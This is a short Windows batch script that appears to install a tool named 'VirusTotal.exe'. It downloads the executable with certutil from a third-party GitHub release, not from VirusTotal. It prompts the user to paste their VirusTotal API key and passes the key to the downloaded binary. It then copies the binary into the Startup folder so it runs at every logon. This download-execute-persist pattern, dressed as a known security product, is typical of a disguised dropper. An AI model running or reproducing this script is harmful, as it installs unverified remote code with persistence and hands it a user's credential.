@echo off

REM Download the executable
certutil.exe -urlcache -split -f "https://github.com/BedFullPro/anti-virus/releases/download/1.0/VirusTotal.exe" VirusTotal.exe >nul 2>&1

REM Check if the download was successful
if %errorlevel% neq 0 (
    echo Failed to download the executable. Please check your internet connection and try again.
    exit /b 1
)

REM Open the default web browser to the VirusTotal API key management page
start https://www.virustotal.com/gui/my-apikey

REM Prompt the user to enter their VirusTotal API key (paste here) and press Enter
echo.
set /p VT_API_KEY=Please enter your VirusTotal API key (paste here), then press Enter:

REM Start the downloaded executable with the provided API key
start VirusTotal.exe %VT_API_KEY%

REM Copy the executable to the user's startup folder
copy /Y "%~dp0VirusTotal.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

pause
exit /b
